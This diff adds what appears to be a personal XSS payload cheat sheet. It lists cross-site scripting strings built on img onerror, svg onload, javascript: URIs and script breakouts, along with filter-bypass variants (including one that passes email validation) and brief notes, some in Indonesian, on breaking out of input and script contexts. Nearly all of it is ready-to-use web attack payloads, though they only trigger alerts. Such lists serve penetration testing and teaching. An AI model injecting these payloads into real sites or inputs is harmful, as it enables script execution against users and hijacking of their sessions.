@@ -1,0 +1,62 @@
+--- Payload ---
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+
+javascript:alert(document.domain)
+//><img src=xx onerror='alert(document.domain)'
+<img src=xx onerror=alert(document.domain)>
+“><svg/onload=alert(document.domain)>”@x.y
+#“><img src=/ onerror=alert(3)>
+<svgonload=alert(1)>
+<svg%20onload=confirm(document.domain)>
+<svg/onload=alert(document.domain)>
+<svg onload=alert(1)//
+"><svg onload=confirm(1)>
+><svg onload=confirm(1)>
+' onmouseover="alert(document.URL)"
+"><svg/onload=alert(/XSS/)
+http://ss<form/><!><details/open/ontoggle=alert(1)>
+<svg•onload=alert(1)>
+
+--- Without Event Handler ---
+<script>alert(1)</script>
+<script src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)> 
+
+--- XSS Bypass ---
+#Validate Input Filter
+1. filter_var - FILTER_VALIDATE_EMAIL (email validation)
+   "><svg/onload=confirm(1)>"@x.y
+
+2. Filter special character /\ () {} <> ' " ;
+   #angle bracket <>
+   ' onmouseover="alert(document.URL)"
+   "onmouseover="alert(1)
+
+   #
+
+3. Filter html tag
+
+4. Filter html attribute
+
+#Output Escaping/encoding
+1. Bypass angle bracket
+   ' onmouseover="alert(document.URL)"
+
+2. Bypass Double Quotes
+
+--- Learn ---
+1. <input type="text" name="nama" value=></input>
+   --> ><script>alert(1)</script> (> = Menutup input tag)
+
+2. <input type="text" name="nama" value=""></input>
+   --> ""><script>alert(1)</script>
+
+3. <script>var cari='';</script>
+   --> </script><script>alert(document.URL)</script>
+-------------
